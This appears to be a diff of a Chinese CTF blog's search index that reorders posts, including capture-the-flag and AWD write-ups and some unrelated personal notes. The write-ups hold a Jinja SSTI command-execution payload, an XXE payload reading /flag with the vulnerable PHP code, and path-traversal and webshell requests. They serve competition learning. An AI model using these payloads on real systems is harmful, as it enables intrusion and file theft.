@@ -314,7 +314,7 @@ class 查的很严啊
 别骂了别骂了
 
 换方法:
-&#123;&#123;x.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()")&#125;&#125;
+&#123;&#123;x.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls').read()&quot;)&#125;&#125;
 成功输出
 改下 payload 读 flag.txt
 NM
@@ -877,6 +877,25 @@ flag get
       </tags>
   </entry>
   <entry>
+    <title>22年10月末</title>
+    <url>/2022/10/22%E5%B9%B410%E6%9C%88%E6%9C%AB/</url>
+    <content><![CDATA[
+  709e820b2f5bb6db36bae87ed03a646f003cb0ce380f747ce4c88c56db22ab5d4185982fe20a41655de1394a5eceab58e21807493670c6615c8e8242ca46bffad9a1b81b645f9265d7dcb889f7879afeeacd2ac55f245aef6303c7f519362152373411c74c6b8780dce51847d73a6477709fd59641feb9af07d20f42a44b033ed79dda6ed6f98348586cf744d49d850e4ec5bf9d0a470c636f7e9ac709ccf9e657bb4b3f29d6a79cb3c4562fd379c8120eea9e54aa23d4b9e094ebd1a55157e901ea92fd7872064f902faf8f672f3dbacd1f701c31b68649f502bc58470b1a6b7922f3f07b789de6a19dd502fc23db922747aaea4e8fb284696956df74bd0960db72dc071cfd0f0205779edb161c60eaaa57425944d14f7072af8a062cfc2b92de432d8445c8c36840a7a1438d6a3d2a70d9110968062dad2639e0e635f13d5d28e6b4cff03fceeadec9a8e1564efaf0af5a65b4387512bbd60c22ec916331ba00342d42ee062544cee85603083aa857877aa38a967181524503fa7b92737dd05d2d0da46d026e2a5b1ef4fd335eee5e670a7e98b0e184d2e8c9725c4e620f277bcfe3066df4b3d8f7087b0cffe8224850c3c9aec3d8875177d0465d73e85cd6a956060ff4bf7392f6006b8d7d7b0b33edc90946f2154083f626ed9d7d30d08a0dbd5bcbb2f99067dea8fbb30f92f57e000811fa1d38d48037186a333ed8172b16de6987d681d30aab8f7853c8f0b95a4bde4bd686c0b859d0ad0e78159bf91901ee1488d1780f4b3f9f3d82dac504d3073c348dd3962284f8d514333ffb08436e2cb7efcb93009b07f3fcbf66cf8719a62746c61f0cb1c5d195277ab4205a861b3db6a1c8d9700fce7cc50ec271c7db4c327715593223c80b903c6eed4915407c1b1126f6e191e43c9d1e740919aa03ab7d244c5abb2bbe57c0786891435a382aaac569d3db80455444ef473227dd16723b8b2f2f02caad59afaeba2e2870cc566240dcb25889e60e5b6c8caee0c05ea419bb3fde2cf606502c9941f01ff08d4951348300786e916e05616ce0953fea477e9b09bbc4c6846f2d73c69a719b21335b46ef04fbeee694db8c284436fe3cc8dd350f040f6ccf8be44663570f4e61bc2ba629d2c4a419b6ef9e421db07085c73c0d27591a2240093707a3405f7a8a947d0312940155e64b61e8cc9ca59b0ea0c44c0a0f71b89a18217000cab0d04a5d7541caa04220d1c1d781ec908acadd46f4ce3b57c3004a5c22236e2bf3b725742a136c2d76f745354a3a498b2a1a2de74a602984d558e80ed4caee0b56e94f52f81bcd3a6bd356389774d3a2d1c82a25b5506eb19157e1ecf9b3bcd2fe8090102ee857548b973d744259d21bad97fa2109ae7b6c59ef55f76c01345fce3971d60c512e20db0e67fd2b640a08786ee260a39bf683d889b48732d4c8134db1bac893b6e1b3bd82f6aa793ec4a200d2ad7a41479cb4ac2ef8da8ce880062bef26baa75b3cf0a9d95ed5a0d10316701ba5ad15070fc1f1b32debddb1a7487c8e657efa130763de6fed57bcf7d5209867303e1637499ce6b203ca72583af6e31b5ae7d153fc9e6f30d2aaa76465aac47a30f2c62a15f24142311b91e928727c04d525d3f6bbc755707db2a7398b003612a9f0a2b922365ab8f5e55b047d3fa23eabe82e6136a05f25484dc5b42843a1f85fedd0094333045c2de32cd1a6a0e96a506be55ffb458047524230b1e1bde6d50a192bea29533b8eac7a2f0a39872f56ae0f9239942efa437871612325c96162fa6a8573b9ef57b40ffce1b91cab7cac838c3ac0c7b8e89915c19bf349066f35af9e99f39de7eb31f978b708b44ade36acce4a18b2f582a4087766d08f5bd2a008442f0ff1d04e096a366270fe9d97dc24050933a595271528e19665bbca39e4810d4b4f27d6a59c129e9286166b366b16e6fa1f1457ca8cbef22190d18adee73a884ae3440b6b230994879d4ba5c7f59874e0170d4cdc43989ae3b84586d209989f002bf3090cd727a33b0a0d9dd61c34fd1e7075e7141761b8f473922659dfb39f9aa58fc1d64646dd8855c9aae8470571db52c5bba61f4353222154aefc19399034dbe812a471fff48daef15060a46efd9be1ddce1ef1000f72c36442b97458a36e7c889c9d25583446fb637ecfb7f10cfd4d0a2ed21d06c89a09da5fb0730f260056809c6c4c86ab75316c4fa8e70451c31ff04b543576bf219fea1e0e006b90c924ae84c7a85a43571e62709f18fdebceebcaa4be1c6e1287aa472d7d018d99e0849bc49affb74a2b4dfe39c2c7d25c1857c7b447011248785a71fecacc374883e72cebef3586cfa5a2e5a757e847792c83e0564c2ad678fabe7785d474b3435a52dc0db42e03059e283b7c3f846e0fb53d46484b2b4a3495ccbd07b0224e1ad1dcc9b35abf22efbea95488d6c64ad8155140bd9df2ec7c4af2fe4d25767c596edc7266a59eebc1a3bb7f9facc62e62a02ae153b712f52224f18d3aa157cc653dab01f6c41c5cf6630005eb77ca2b4c63438934e2a686890b8c41240dbf9aa97cabc258fd87e9b7f420418b829b723f5122957809ebbfad3705986cade1e083ab134ab42203cdf3ca483205dfe2ee8fa1dae896ff8eed919497f8311a735ca489af3dfa3330282e444d6355d7112c21e5338aa3d8eb973422baac441c455390c8b8b67c487ce4a12797a1db2da67b23c1a62f883fed967571abc8dfedba81b3c2ae883bc16a3fd57cf8ac84441f50e39398ec3d6147e55f97a747eacc47916fde75998cfb091ff24079523b87c3c1524dd911762fc2745df179ae1060bf0587c24f34efb51edcb67281a01a86f2e6353a78930b0d7f675dab74e0f4d0747df4dfdb19c8d000595b67c810741253a0c96b2985125e64081c1256e1a9a99f5df6af152b231086639cca1015afe3aba6b5ddb773c7be4b51430c2f27148e3350e1ed2e48847201fc429d7f9bbe012bb7188ef13944d0046a898a73b9565878161e1054e2012ff34c3aaecf78b04f10991df675b12d2cdd628ab7df8d9fa5d07f6c9e5c299fda52578ac89365c4204a311114bd1503ce254e3b2a8d92a867c26d82d3b1ddbb0b5298d247e56311959c19d39ee5428f605c6b77cfa717a7edb1c3563f23d99cc226055e1fc04d4636e4de9c09d9af3f9b70ce0653b22a4893ea5eeb13200bf6884695bfbaef888a0747102e78bce080f12ee0ab41c97d27dbc440ff853888d897401c520d52429dda58477536a4322be15cfe65a8a342745c0a4778479dad5b1152abc537beea5ce79dbf5b64c2cf249950aacba98a7780e2f79284a4c1951f529958dd957e0a17c6f4f78137df21ef40e2c2ecdbf89543414012dc23338b8032e74c4215e13cdc0617a815e020bd9f9159ddb02ca8d6ad0e2790a4510173a64eece787d3d5ef77d2d32ba894b22d71a007c8e0899ec1876245114aac225b0644cc0fe2ad98533c7f70ddb4649ca32a3a0b10f2da66ac9e1bf8443f5ebfa9d1f07979d7efb67c46a304e923e83764a94010f03d8252ae0fd6caa34d7240946668d324585fe746e4b51e444e73b439b442abf15f18ff0a8ea2ddce7f4224fcfd35ccf387fab6093df86c21ebb4844f554dd8435cea22b20a9b40bcff3f45aa444c417f5d8ee80b38bca847af0a9163d8d4c6e9b3effa5f817203443b09e920c7b2f13b6b68bd69cf6ba65e4a21867751e18117a1bb0e6e95985b7a865b4770b1356b5da04f34a6470d7684958c36396255b1724aaf0ebb7af3050ffd6368528da071a5ed88a52c5b87f7bc01be713205b78a854aaf6b1bbed5140945226dbad39146df713a870f8a25d1fffc2684718d753a826b1cdb702bd33079f43d8cb818c95075bcac0007c844cfd23601fd4830ff64d1a2327ccb664a653dfae909434e0db63a7aa78dec34bd77e83ae749303cb91c2ed96dc34ee2959e5d541f0013ff7463fcb4b2056259f454fe0e4bfc3ac8862df59aa5598ab825d626e82688227299483d5eda17d65caee1ddabe66e0dead8c2d99da599562fc841b00c108da93b26fb75f62c36a42275c7b02bed8b8c825d37a955e507ec0afb3010e0d4d7fca429f2392312f05e011d6cf19c0f5eba6cd9405e351f3175b8afe59513037191d24cd037c5fada0f6bda47b22f231d878af7391c8d2fe876c9cdb1b713a9230e016790a0d76deddffc4184ccb48088fa8c0c44c23a1ec6a1e618119315829b83106c87554e2bb3db60c2756f235afe8c5920f4df414f5e47ee4010b57ada32d3749a466c6a347fd0f2ec83040daaa4b35ebf9c1bfca7656cdab88214addbb371f971a042c3d4d2bf3aa5b1c38d8b8f86d7df2bd30969fd0bcf37a6dbde5fc8a0075ca9a45ef9ef79ccfb98c156d4304c670fcdcaa9e1933f0c367db98baa07adb2a830ac1757a58ffd9508b83dc78f9383eabaf2d3ccba676ab348b4
+  
+    
+      
+      
+        密码是我的姓名首字母小写
+      
+    
+  
+
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Bypass disable_function</title>
     <url>/2022/05/Bypass%20disable_function/</url>
     <content><![CDATA[ LD_PRELOAD
@@ -1120,25 +1139,6 @@ echo $response;
       </tags>
   </entry>
   <entry>
-    <title>22年10月末</title>
-    <url>/2022/10/22%E5%B9%B410%E6%9C%88%E6%9C%AB/</url>
-    <content><![CDATA[
-  709e820b2f5bb6db36bae87ed03a646f003cb0ce380f747ce4c88c56db22ab5d4185982fe20a41655de1394a5eceab58e21807493670c6615c8e8242ca46bffad9a1b81b645f9265d7dcb889f7879afeeacd2ac55f245aef6303c7f519362152373411c74c6b8780dce51847d73a6477709fd59641feb9af07d20f42a44b033ed79dda6ed6f98348586cf744d49d850e4ec5bf9d0a470c636f7e9ac709ccf9e657bb4b3f29d6a79cb3c4562fd379c8120eea9e54aa23d4b9e094ebd1a55157e901ea92fd7872064f902faf8f672f3dbacd1f701c31b68649f502bc58470b1a6b7922f3f07b789de6a19dd502fc23db922747aaea4e8fb284696956df74bd0960db72dc071cfd0f0205779edb161c60eaaa57425944d14f7072af8a062cfc2b92de432d8445c8c36840a7a1438d6a3d2a70d9110968062dad2639e0e635f13d5d28e6b4cff03fceeadec9a8e1564efaf0af5a65b4387512bbd60c22ec916331ba00342d42ee062544cee85603083aa857877aa38a967181524503fa7b92737dd05d2d0da46d026e2a5b1ef4fd335eee5e670a7e98b0e184d2e8c9725c4e620f277bcfe3066df4b3d8f7087b0cffe8224850c3c9aec3d8875177d0465d73e85cd6a956060ff4bf7392f6006b8d7d7b0b33edc90946f2154083f626ed9d7d30d08a0dbd5bcbb2f99067dea8fbb30f92f57e000811fa1d38d48037186a333ed8172b16de6987d681d30aab8f7853c8f0b95a4bde4bd686c0b859d0ad0e78159bf91901ee1488d1780f4b3f9f3d82dac504d3073c348dd3962284f8d514333ffb08436e2cb7efcb93009b07f3fcbf66cf8719a62746c61f0cb1c5d195277ab4205a861b3db6a1c8d9700fce7cc50ec271c7db4c327715593223c80b903c6eed4915407c1b1126f6e191e43c9d1e740919aa03ab7d244c5abb2bbe57c0786891435a382aaac569d3db80455444ef473227dd16723b8b2f2f02caad59afaeba2e2870cc566240dcb25889e60e5b6c8caee0c05ea419bb3fde2cf606502c9941f01ff08d4951348300786e916e05616ce0953fea477e9b09bbc4c6846f2d73c69a719b21335b46ef04fbeee694db8c284436fe3cc8dd350f040f6ccf8be44663570f4e61bc2ba629d2c4a419b6ef9e421db07085c73c0d27591a2240093707a3405f7a8a947d0312940155e64b61e8cc9ca59b0ea0c44c0a0f71b89a18217000cab0d04a5d7541caa04220d1c1d781ec908acadd46f4ce3b57c3004a5c22236e2bf3b725742a136c2d76f745354a3a498b2a1a2de74a602984d558e80ed4caee0b56e94f52f81bcd3a6bd356389774d3a2d1c82a25b5506eb19157e1ecf9b3bcd2fe8090102ee857548b973d744259d21bad97fa2109ae7b6c59ef55f76c01345fce3971d60c512e20db0e67fd2b640a08786ee260a39bf683d889b48732d4c8134db1bac893b6e1b3bd82f6aa793ec4a200d2ad7a41479cb4ac2ef8da8ce880062bef26baa75b3cf0a9d95ed5a0d10316701ba5ad15070fc1f1b32debddb1a7487c8e657efa130763de6fed57bcf7d5209867303e1637499ce6b203ca72583af6e31b5ae7d153fc9e6f30d2aaa76465aac47a30f2c62a15f24142311b91e928727c04d525d3f6bbc755707db2a7398b003612a9f0a2b922365ab8f5e55b047d3fa23eabe82e6136a05f25484dc5b42843a1f85fedd0094333045c2de32cd1a6a0e96a506be55ffb458047524230b1e1bde6d50a192bea29533b8eac7a2f0a39872f56ae0f9239942efa437871612325c96162fa6a8573b9ef57b40ffce1b91cab7cac838c3ac0c7b8e89915c19bf349066f35af9e99f39de7eb31f978b708b44ade36acce4a18b2f582a4087766d08f5bd2a008442f0ff1d04e096a366270fe9d97dc24050933a595271528e19665bbca39e4810d4b4f27d6a59c129e9286166b366b16e6fa1f1457ca8cbef22190d18adee73a884ae3440b6b230994879d4ba5c7f59874e0170d4cdc43989ae3b84586d209989f002bf3090cd727a33b0a0d9dd61c34fd1e7075e7141761b8f473922659dfb39f9aa58fc1d64646dd8855c9aae8470571db52c5bba61f4353222154aefc19399034dbe812a471fff48daef15060a46efd9be1ddce1ef1000f72c36442b97458a36e7c889c9d25583446fb637ecfb7f10cfd4d0a2ed21d06c89a09da5fb0730f260056809c6c4c86ab75316c4fa8e70451c31ff04b543576bf219fea1e0e006b90c924ae84c7a85a43571e62709f18fdebceebcaa4be1c6e1287aa472d7d018d99e0849bc49affb74a2b4dfe39c2c7d25c1857c7b447011248785a71fecacc374883e72cebef3586cfa5a2e5a757e847792c83e0564c2ad678fabe7785d474b3435a52dc0db42e03059e283b7c3f846e0fb53d46484b2b4a3495ccbd07b0224e1ad1dcc9b35abf22efbea95488d6c64ad8155140bd9df2ec7c4af2fe4d25767c596edc7266a59eebc1a3bb7f9facc62e62a02ae153b712f52224f18d3aa157cc653dab01f6c41c5cf6630005eb77ca2b4c63438934e2a686890b8c41240dbf9aa97cabc258fd87e9b7f420418b829b723f5122957809ebbfad3705986cade1e083ab134ab42203cdf3ca483205dfe2ee8fa1dae896ff8eed919497f8311a735ca489af3dfa3330282e444d6355d7112c21e5338aa3d8eb973422baac441c455390c8b8b67c487ce4a12797a1db2da67b23c1a62f883fed967571abc8dfedba81b3c2ae883bc16a3fd57cf8ac84441f50e39398ec3d6147e55f97a747eacc47916fde75998cfb091ff24079523b87c3c1524dd911762fc2745df179ae1060bf0587c24f34efb51edcb67281a01a86f2e6353a78930b0d7f675dab74e0f4d0747df4dfdb19c8d000595b67c810741253a0c96b2985125e64081c1256e1a9a99f5df6af152b231086639cca1015afe3aba6b5ddb773c7be4b51430c2f27148e3350e1ed2e48847201fc429d7f9bbe012bb7188ef13944d0046a898a73b9565878161e1054e2012ff34c3aaecf78b04f10991df675b12d2cdd628ab7df8d9fa5d07f6c9e5c299fda52578ac89365c4204a311114bd1503ce254e3b2a8d92a867c26d82d3b1ddbb0b5298d247e56311959c19d39ee5428f605c6b77cfa717a7edb1c3563f23d99cc226055e1fc04d4636e4de9c09d9af3f9b70ce0653b22a4893ea5eeb13200bf6884695bfbaef888a0747102e78bce080f12ee0ab41c97d27dbc440ff853888d897401c520d52429dda58477536a4322be15cfe65a8a342745c0a4778479dad5b1152abc537beea5ce79dbf5b64c2cf249950aacba98a7780e2f79284a4c1951f529958dd957e0a17c6f4f78137df21ef40e2c2ecdbf89543414012dc23338b8032e74c4215e13cdc0617a815e020bd9f9159ddb02ca8d6ad0e2790a4510173a64eece787d3d5ef77d2d32ba894b22d71a007c8e0899ec1876245114aac225b0644cc0fe2ad98533c7f70ddb4649ca32a3a0b10f2da66ac9e1bf8443f5ebfa9d1f07979d7efb67c46a304e923e83764a94010f03d8252ae0fd6caa34d7240946668d324585fe746e4b51e444e73b439b442abf15f18ff0a8ea2ddce7f4224fcfd35ccf387fab6093df86c21ebb4844f554dd8435cea22b20a9b40bcff3f45aa444c417f5d8ee80b38bca847af0a9163d8d4c6e9b3effa5f817203443b09e920c7b2f13b6b68bd69cf6ba65e4a21867751e18117a1bb0e6e95985b7a865b4770b1356b5da04f34a6470d7684958c36396255b1724aaf0ebb7af3050ffd6368528da071a5ed88a52c5b87f7bc01be713205b78a854aaf6b1bbed5140945226dbad39146df713a870f8a25d1fffc2684718d753a826b1cdb702bd33079f43d8cb818c95075bcac0007c844cfd23601fd4830ff64d1a2327ccb664a653dfae909434e0db63a7aa78dec34bd77e83ae749303cb91c2ed96dc34ee2959e5d541f0013ff7463fcb4b2056259f454fe0e4bfc3ac8862df59aa5598ab825d626e82688227299483d5eda17d65caee1ddabe66e0dead8c2d99da599562fc841b00c108da93b26fb75f62c36a42275c7b02bed8b8c825d37a955e507ec0afb3010e0d4d7fca429f2392312f05e011d6cf19c0f5eba6cd9405e351f3175b8afe59513037191d24cd037c5fada0f6bda47b22f231d878af7391c8d2fe876c9cdb1b713a9230e016790a0d76deddffc4184ccb48088fa8c0c44c23a1ec6a1e618119315829b83106c87554e2bb3db60c2756f235afe8c5920f4df414f5e47ee4010b57ada32d3749a466c6a347fd0f2ec83040daaa4b35ebf9c1bfca7656cdab88214addbb371f971a042c3d4d2bf3aa5b1c38d8b8f86d7df2bd30969fd0bcf37a6dbde5fc8a0075ca9a45ef9ef79ccfb98c156d4304c670fcdcaa9e1933f0c367db98baa07adb2a830ac1757a58ffd9508b83dc78f9383eabaf2d3ccba676ab348b4
-  
-    
-      
-      
-        密码是我的姓名首字母小写
-      
-    
-  
-
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ctfhub-彩蛋</title>
     <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
     <content><![CDATA[ 工具 彩蛋
@@ -1348,239 +1348,6 @@ filehash 不同 请自行加密
       </tags>
   </entry>
   <entry>
-    <title>Visual Studio 2022界面美化教程</title>
-    <url>/2021/12/Visual%20Studio%202022%E7%95%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
-    <content><![CDATA[
-我之前用的是 2019 版本，后来有出新版我也没管，直到前几天他给我推送 2022 版了，查了下大部分都是好评（bug 恐惧症和恋旧），于是我决定入 2022 版了，但又怕我在 2019 调好的设置用不到 2022 上，于是暂时让两个版本共存，等 2022 调试好了再说 2019 的事。
-这是我在 2019 上美化用到的插件和设置（因为网上类似的不少，但 2022 版貌似没有人发过，所以我决定写这篇文章）
-不出所料，2022 版好多东西更新，导致一些东西不能用了，导入 2019 版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。
-但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。
-第一个插件，是 2019 版变的，变了样之后差点给我整不会了，它是类似于编程。
-新建项目 C#里面最后一项
-
-
-创建之后，把 2019 版的该插件里的美化设置导出，然后重命名为 CustomTheme.vstheme
-然后复制到你新创建的 2022 版那个项目里，选择替换更新，之后项目文件夹里.sln 后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启 visualstudio 就可以了
-
-这个插件是为后面设置背景图片准备
-第二个插件我原来用的是 moeIDE，但是 2022 版它不支持了，所以就用新插件代替了。
-
-背景图是 B 站 1024 节发布的一张壁纸，我用 ps 调了下对比度，让他更鲜艳一些
-
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>visual studio 2022</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>arch + niri + noctalia-shell安装记录</title>
-    <url>/2026/01/arch/</url>
-    <content><![CDATA[
-本文只是记录非教程，教程见下方参考文献
-
-仅以此文悼念出生未满一周便被安乐的Arch娘
- 起因
-跟了我四年多的笔记本512G硬盘又双叒叕爆红了，又到了例行重装系统的时候了
-但是这一次我直接选择买一块硬盘，虽然是这价格涨到天际的时候，一块1T PCIE3gen4
-别问为什么是pcie3 因为是老电脑 1TB是因为没钱 请各位鸽鸽们打赏点吧
-于是打算干脆装个arch + niri + noctalia-shell
-反正网上说适配得不错了，一些软件的wayland水土不服也都有教程了
-最重要的是，我刷到了linux steam-proton 跑三角洲的教程，我又正好是劳steam服玩家（这里记住下面要考）
- 安装arch
-无他唯手熟耳，由于我有多次安装经验，第一次装在物理机上也是一次成功
-教程[1]见下方参考文献
-
-此教程[1:1]有个小坑，单系统物理机安装时需要注意分区时加上grub分区，作者写在另一个页面了
-
- 安装niri
-这里跟的教程[2]，但是也没有完全跟着走，因为这里面有一些小坑
-这里推荐把依赖都装好后直接在niri配置文件~/.config/niri/config.kdl里面加上
-1spawn-at-startup "qs" "-c" "noctalia-shell"
-然后启动niri，你就能正常使用了图形化了
-再根据noctalia-shell官方教程[3]配置属于自己的桌面环境
- 死因
-根据B站和油管的相关视频配置三角洲，结果第一步就卒了
-根本打不开，翻评论区才发现，三角洲ACE升级了，添加了完整性检测，替换成卡拉比丘ACE的方法失效了
-如有大佬在linux上成功启动三角洲，请务必在评论区踢我
- 总结
-如果你不玩游戏或只玩原生或已被proton支持且未被反作弊追杀的游戏（如永劫无间、CS2、LOL、MC等，瓦据说CachyOS做了反反作弊，可以看看是怎么实现的，也可以直接去用CachyOS，它是一个针对游戏进行了优化的Arch分支，也很推荐）
-那么非常推荐使用ArchLinux或其分支，并推荐niri+noctalia桌面，除游戏外各方面体验已经非常好了，也比较容易上手了
- 图片展示
-
-被QQ压缩了，原图是很清晰的
-
-
-    [{"url":"/img/ba4d06c205eb3ca9ade48c1f6aa60aa7_720.png","alt":"niri展示","title":""},{"url":"/img/be5cc1c6e7d41f0a25f3cd23164a191a_720.png","alt":"edge in arch","title":""},{"url":"/img/1f9df7afbd8c47eae926cf91e1d101d3_720.png","alt":"winboat (lsw wsl翻版)","title":""},{"url":"/img/49733e36b12e83e5127ace51e46862c6_720.png","alt":"三角洲你怎么这么坏.jpg","title":""}]
-  
- 参考文献
-
-
-
-archlinux简明指南 ↩︎ ↩︎
-
-Niri安装与配置 ↩︎
-
-Noctalia-shell ↩︎
-
-
-
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>arch</tag>
-        <tag>wayland</tag>
-        <tag>niri</tag>
-        <tag>noctalia</tag>
-        <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 长城杯铁人三项半决赛第二赛区 wp</title>
-    <url>/2024/05/awdwp/</url>
-    <content><![CDATA[(未整理完)
- CFS
- misc1
-备份文件泄露
-下载后是流量包
-流量包存在明文 flag
-（这里可能是非预期，预期是 aes 破解到 test 密码后，有个页面有个 flag）
-
- misc2
-流量里还有一个 flag.zip
-导出后
-爆破得密码为 123456
- web
-存在 rce 查看解析目录后 echo 一句话木马进去
-连接后 cat /flag 啥啥啥.txt
-flag get
-
- AWD
-题目附件备份：
-php
-java1
-java2
- php
-hook 流量发现一个 php 路径穿越
-/frontend/ajax/getfile?file=../../../../../../flag.txt
-修复：
-将/和.等用于路径穿越的字符过滤置空
-
- java1
-一个 java
-/forget.jsp?cmd1=cat+/flag.txt
-修复 把 cmd1 字段改成复杂密码 使攻击者无法连接
-
-]]></content>
-      <categories>
-        <category>awd</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-        <tag>长城杯</tag>
-        <tag>铁人三项</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxe</title>
-    <url>/2022/12/XXE/</url>
-    <content><![CDATA[ XXE
-发现输入的 username 被 alert 了
-查源码
-1onclick = "XMLFunction()";
-抓包看 xml 格式
-回来看控制台
-发现 js 的 xml 应用
-123456789101112131415161718192021&#x3C;script type="text/javascript">
-        function XMLFunction(){
-            var xml = '' +
-                '&#x3C;?xml version="1.0" encoding="UTF-8"?>' +
-            '&#x3C;root>' +
-            ' &#x3C;username>' + $('#username').val() + '&#x3C;/username>' +
-            ' &#x3C;password>' + $('#password').val() + '&#x3C;/password>' +
-            ' &#x3C;/root>';
-            var xmlhttp = new XMLHttpRequest();
-            xmlhttp.onreadystatechange = function () {
-                if(xmlhttp.readyState == 4){
-                    console.log(xmlhttp.readyState);
-                    console.log(xmlhttp.responseText);
-                    alert(xmlhttp.responseText);
-
-                }
-            }
-            xmlhttp.open("POST","login.php",true);
-            xmlhttp.send(xml);
-        };
-    &#x3C;/script>
-构造 xxe 攻击
-这是 post 包传的时候记得把注释删去
-12345678&#x3C;?xml version="1.0" encoding="UTF-8"?>
-&#x3C;!DOCTYPE root[
-&#x3C;!ENTITY flag SYSTEM "file:///flag">&#x3C;!--构造实体-->
-]>
-&#x3C;root>
-&#x3C;username>&#x26;flag;&#x3C;/username>&#x3C;!--输出flag实体-->
-&#x3C;password>2333&#x3C;/password>
-&#x3C;/root>
-flag{6866a844-3788-4a9d-9909-1d9d9943f56f}
-
-
-123456789101112131415161718192021222324252627282930313233&#x3C;?php
-/**
-* autor: c0ny1
-* date: 2018-2-7
-*/
-
-$USERNAME = 'admin'; //账号
-$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
-$result = null;
-
-libxml_disable_entity_loader(false);
-$xmlfile = file_get_contents('php://input');
-
-try{
-	$dom = new DOMDocument();
-	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
-	$creds = simplexml_import_dom($dom);
-
-	$username = $creds->username;
-	$password = $creds->password;
-
-	if($username == $USERNAME &#x26;&#x26; $password == $PASSWORD){
-		$result = sprintf("&#x3C;result>&#x3C;code>%d&#x3C;/code>&#x3C;msg>%s&#x3C;/msg>&#x3C;/result>",1,$username);
-	}else{
-		$result = sprintf("&#x3C;result>&#x3C;code>%d&#x3C;/code>&#x3C;msg>%s&#x3C;/msg>&#x3C;/result>",0,$username);
-	}
-}catch(Exception $e){
-	$result = sprintf("&#x3C;result>&#x3C;code>%d&#x3C;/code>&#x3C;msg>%s&#x3C;/msg>&#x3C;/result>",3,$e->getMessage());
-}
-
-header('Content-Type: text/html; charset=utf-8');
-echo $result;
-?>
-有 admin 密码了也没用
-藏内网了，上次比赛 ssrf 题出过
-
-etc/hosts
-proc/net/arp
-
-
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xxe</tag>
-        <tag>buuctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>UofTCTF复现</title>
     <url>/2025/11/UofTCTF%E5%A4%8D%E7%8E%B0wp/</url>
     <content><![CDATA[ web
@@ -1733,6 +1500,211 @@ print(res.text)
         <tag>web</tag>
         <tag>CTF复现</tag>
         <tag>UofTCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe</title>
+    <url>/2022/12/XXE/</url>
+    <content><![CDATA[ XXE
+发现输入的 username 被 alert 了
+查源码
+1onclick = "XMLFunction()";
+抓包看 xml 格式
+回来看控制台
+发现 js 的 xml 应用
+123456789101112131415161718192021&#x3C;script type="text/javascript">
+        function XMLFunction(){
+            var xml = '' +
+                '&#x3C;?xml version="1.0" encoding="UTF-8"?>' +
+            '&#x3C;root>' +
+            ' &#x3C;username>' + $('#username').val() + '&#x3C;/username>' +
+            ' &#x3C;password>' + $('#password').val() + '&#x3C;/password>' +
+            ' &#x3C;/root>';
+            var xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange = function () {
+                if(xmlhttp.readyState == 4){
+                    console.log(xmlhttp.readyState);
+                    console.log(xmlhttp.responseText);
+                    alert(xmlhttp.responseText);
+
+                }
+            }
+            xmlhttp.open("POST","login.php",true);
+            xmlhttp.send(xml);
+        };
+    &#x3C;/script>
+构造 xxe 攻击
+这是 post 包传的时候记得把注释删去
+12345678&#x3C;?xml version="1.0" encoding="UTF-8"?>
+&#x3C;!DOCTYPE root[
+&#x3C;!ENTITY flag SYSTEM "file:///flag">&#x3C;!--构造实体-->
+]>
+&#x3C;root>
+&#x3C;username>&#x26;flag;&#x3C;/username>&#x3C;!--输出flag实体-->
+&#x3C;password>2333&#x3C;/password>
+&#x3C;/root>
+flag{6866a844-3788-4a9d-9909-1d9d9943f56f}
+
+
+123456789101112131415161718192021222324252627282930313233&#x3C;?php
+/**
+* autor: c0ny1
+* date: 2018-2-7
+*/
+
+$USERNAME = 'admin'; //账号
+$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
+$result = null;
+
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+
+try{
+	$dom = new DOMDocument();
+	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds->username;
+	$password = $creds->password;
+
+	if($username == $USERNAME &#x26;&#x26; $password == $PASSWORD){
+		$result = sprintf("&#x3C;result>&#x3C;code>%d&#x3C;/code>&#x3C;msg>%s&#x3C;/msg>&#x3C;/result>",1,$username);
+	}else{
+		$result = sprintf("&#x3C;result>&#x3C;code>%d&#x3C;/code>&#x3C;msg>%s&#x3C;/msg>&#x3C;/result>",0,$username);
+	}
+}catch(Exception $e){
+	$result = sprintf("&#x3C;result>&#x3C;code>%d&#x3C;/code>&#x3C;msg>%s&#x3C;/msg>&#x3C;/result>",3,$e->getMessage());
+}
+
+header('Content-Type: text/html; charset=utf-8');
+echo $result;
+?>
+有 admin 密码了也没用
+藏内网了，上次比赛 ssrf 题出过
+
+etc/hosts
+proc/net/arp
+
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>arch + niri + noctalia-shell安装记录</title>
+    <url>/2026/01/arch/</url>
+    <content><![CDATA[
+本文只是记录非教程，教程见下方参考文献
+
+仅以此文悼念出生未满一周便被安乐的Arch娘
+ 起因
